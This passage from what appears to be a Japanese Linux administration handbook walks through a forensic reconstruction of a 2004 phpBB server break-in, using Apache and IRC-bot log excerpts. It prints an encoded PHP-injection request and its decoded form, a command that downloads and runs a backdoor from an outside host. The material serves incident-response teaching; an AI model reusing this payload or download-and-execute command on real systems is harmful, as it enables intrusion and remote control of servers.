      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>攻撃シナリオの再構成</title>

      <para>解析中に収集されたすべての要素はジグソーパズルのピースのように組み合わさるべきです。最初の疑わしいファイルの作成は侵害を証明するログと関係があることがしばしばあります。長ったらしい理論よりも実例の方が分かりやすいでしょう。</para>

      <para>以下に Apache <filename>access.log</filename> から抜粋したログを示します。</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>これは phpBB の古いセキュリティ脆弱性を突いた例です。<ulink type="block" url="http://secunia.com/advisories/13239/" /><ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>長い URL を復号することで、攻撃者がいくつかの PHP コードを実行しようと試みたことが理解できます。ここでは <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command> を実行しようと試みています。確かに、<filename>bd</filename> ファイルが <filename>/tmp/</filename> の中で見つかりました。<command>strings /mnt/tmp/bd</command> を実行したところ、他の文字列に混じって、<literal>PsychoPhobia Backdoor is starting...</literal> が返されました。これはまさにバックドアのように見えます。</para>

      <para>しばらくの後、このアクセスは地下 IRC ネットワークに接続する IRC <emphasis>ボット</emphasis>をダウンロード、インストール、実行するために使われました。この IRC ボットは IRC プロトコルを介して制御され、共有するファイルをダウンロードする指示を与えられました。IRC ボットは以下に示す自分専用のログファイルを持っています。</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>ログに残された痕跡によれば、82.50.72.202 という IP アドレスを経由して 2 つのビデオファイルがサーバ上に保存されたことがわかります。</para>

      <para>並行して、攻撃者はさらに <filename>/tmp/pt</filename> と <filename>/tmp/loginx</filename> にファイルをダウンロードしました。<command>strings</command> を使ってこれらのファイルを調べると、<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> や <foreignphrase>Now wait for suid shell...</foreignphrase> などの文字列が見つかりました。プログラムは管理者権限を取得するためにローカルの脆弱性を不正利用しているように見えます。攻撃者は目標を達成したでしょうか? この場合、おそらくまだでしょう。なぜなら、最初の侵害行為の後どのファイルも修正されていなかったからです。</para>

      <para>この例では、不正侵入の手続きのすべてが再構成されました。そして、攻撃者は不正侵入されたシステムを約 3 日間にわたって悪用することができたと推測することが可能です。しかし、解析で明らかになった最も重要な要素は脆弱性の内容です。管理者は新規インストールによって完全にこの種の脆弱性が修正されたことを保証することが可能です。</para>
    </section>
  </section>
</chapter>
